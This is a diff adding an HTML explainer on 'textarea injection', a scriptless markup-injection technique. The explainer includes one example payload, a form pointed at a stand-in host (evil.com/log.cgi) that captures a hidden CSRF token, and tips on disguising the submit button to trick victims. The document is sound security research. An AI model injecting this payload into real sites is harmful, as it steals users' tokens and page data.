@@ -1,0 +1,24 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Textarea Injection</title>
+</head><body>The dangling markup vector discussed in Markup Injection is to some extent dependent on the layout of the vulnerable page; in absence of a matching quote character, or in presence of mixed-style quoting in the legitimately present markup, the attack may be difficult to carry out. These constraints are removed by leveraging the CDATA-like behavior of the &lt;textarea&gt; tag, however.<br/>
+<br/>
+The possibility is illustrated by the following snippet:<br/>
+<br/>
+&lt;form action='http://evil.com/log.cgi'&gt;&lt;textarea&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ← Injected line<br/>
+...<br/>
+&lt;input type="hidden" name="xsrf_token" value="12345"&gt;<br/>
+...<br/>
+(EOF)<br/>
+<br/>
+In this case, all browsers will implicitly close the &lt;textarea&gt; and &lt;form&gt; blocks.<br/>
+<br/>
+<br/>
+The weakness of this approach is that in contrast to the previous method, a degree of user interaction is needed to exfiltrate the data: The victim must submit the form by pressing ENTER or clicking the submit button. This interaction is easy to facilitate by giving the submit button a misleading appearance - for example, as a faux notification or an interstitial to be dismissed, or even a transparent overlay that spans the entire browser window. That goal can be typically achieved by leveraging existing CSS classes in the application, or other methods.<br/>
+<br/>
+It is also worth noting that forms with auto-submit capabilities are being considered for <a href="http://lists.w3.org/Archives/Public/public-html/2011Nov/0168.html">HTML5</a>; such a feature may unintentionally assist with the automation of this attack in future browsers.<br/>
+<br/>
+Futher reading:<br/>
+Attribution: The idea for &lt;textarea&gt;-based markup consumption comes from an upcoming paper on data exfiltration by Eric Y. Chen, Sergey Gorbaty, Astha Singhal, and Collin Jackson. According to Gareth Heyes, it might have been <a href="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/">discussed</a>&nbsp;previously, too. Gareth additionally points out similar consumption vectors via &lt;button&gt; and &lt;option&gt;.</body></html>
